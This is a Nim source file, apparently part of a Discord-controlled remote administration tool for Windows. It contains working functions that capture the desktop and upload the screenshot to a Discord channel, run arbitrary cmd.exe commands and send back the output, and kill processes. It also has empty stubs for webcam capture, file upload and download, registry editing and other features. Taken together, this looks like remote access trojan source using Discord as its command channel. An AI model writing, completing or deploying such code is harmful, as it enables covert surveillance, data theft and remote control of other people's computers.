import asyncdispatch, dimscord, strutils, strformat, sender, winim, pixie
import winim / inc / windef
from osproc import execCmdEx
from os import setCurrentDir, getCurrentDir, dirExists

var messageSender = Sender()


type PcControl* = ref object
    api: RestApi
    channelId: string

proc setApi*(self: var PcControl, api: RestApi) =
    self.api = api

proc setChannelId*(self: var PcControl, channelId: string) = 
    self.channelId = channelId

# --- SCREENSHOT --- #
# https://gist.github.com/treeform/782149b5fc938753feacfca43637aa90
proc handleScreenshot(self: PcControl, filePath: string): Image =
    # get size of the main screen
    var screenRect: windef.Rect
    GetClientRect GetDesktopWindow(), addr screenRect
    let
        x = screenRect.left
        y = screenRect.top
        w = (screenRect.right - screenRect.left)
        h = (screenRect.bottom - screenRect.top)

    # create an image
    var image = newImage(w, h)

    # copy screen data to bitmap
    var
        hScreen = GetDC(cast[HWND](nil))
        hDC = CreateCompatibleDC(hScreen)
        hBitmap = CreateCompatibleBitmap(hScreen, int32 w, int32 h)


    discard SelectObject(hDC, hBitmap)
    discard BitBlt(hDC, 0, 0, int32 w, int32 h, hScreen, int32 x, int32 y, SRCCOPY)

    # setup bmi structure
    var mybmi: BITMAPINFO
    mybmi.bmiHeader.biSize = int32 sizeof(mybmi)
    mybmi.bmiHeader.biWidth = w
    mybmi.bmiHeader.biHeight = h
    mybmi.bmiHeader.biPlanes = 1
    mybmi.bmiHeader.biBitCount = 32
    mybmi.bmiHeader.biCompression = BI_RGB
    mybmi.bmiHeader.biSizeImage = w * h * 4

    # copy data from bmi structure to the flippy image
    discard CreateDIBSection(hdc, addr mybmi, DIB_RGB_COLORS, cast[ptr pointer](unsafeAddr image.data[0]), 0, 0)
    discard GetDIBits(hdc, hBitmap, 0, h, cast[ptr pointer](unsafeAddr image.data[0]), addr mybmi, DIB_RGB_COLORS)

    # for some reason windows bitmaps are flipped? flip it back
    image.flipVertical()

    # for some reason windows uses BGR, convert it to RGB
    for i in 0 ..< image.height * image.width:
        swap image.data[i].r, image.data[i].b

    # delete data [they are not needed anymore]
    DeleteObject hdc
    DeleteObject hBitmap

    image.writeFile filePath

proc screenshot*(self: PcControl, savePath: string): Future[Message] {.async.} = 

    let filePath = &"{savePath}\\sc.png"

    discard self.handleScreenshot(filePath)

    discard await messageSender.sendFiles(self.api, self.channelId, filePath)

# --- SHELL --- #
proc shell*(self: PcControl, command: string): Future[Message] {.async.} =
    var output: string
    try:
        output = execCmdEx(&"cmd.exe /c {command}").output
        discard await messageSender.sendOutput(self.api, self.channelId, output)
    except:
        discard await messageSender.sendOutput(self.api, self.channelId, "Error")

# --- CD --- #
proc cd*(self: PcControl, path: string): Future[Message] {.async.} = 
    try:
        if not dirExists(path):
            discard await messageSender.sendOutput(self.api, self.channelId, "Path Not Found")
            return
        setCurrentDir(path)
        discard await messageSender.sendOutput(self.api, self.channelId, &"Changed path to {getCurrentDir()}")
    except:
        discard await messageSender.sendOutput(self.api, self.channelId, "Error")

# --- TASKKILL --- #
proc taskkill*(self: PcControl, processName: string): Future[Message] {.async.} =
    try:
        let output = execCmdEx(&"cmd.exe /c taskkill /f /im {processName}").output
        discard await messageSender.sendOutput(self.api, self.channelId, output)
    except:
        discard await messageSender.sendOutput(self.api, self.channelId, "Error")

# --- TASKLIST --- #

# --- ISADMIN --- #

# --- UPLOAD --- #

# --- DOWNLOAD --- #

# --- REGISTRY --- #

# --- RUN --- #

# --- MESSAGEBOX --- #

# --- SHUTDOWN --- #

# --- RESTART --- #

# --- SIGNOUT --- #

# --- BLOCK --- #

# --- UNBLOCK --- #

# --- WEBCAMCAPTURE --- #

# --- STATRPROCESS --- #

# --- OPENURL --- #

# --- PLAYAUDIO --- #

# --- SPEECH --- #

# --- CLEANER --- #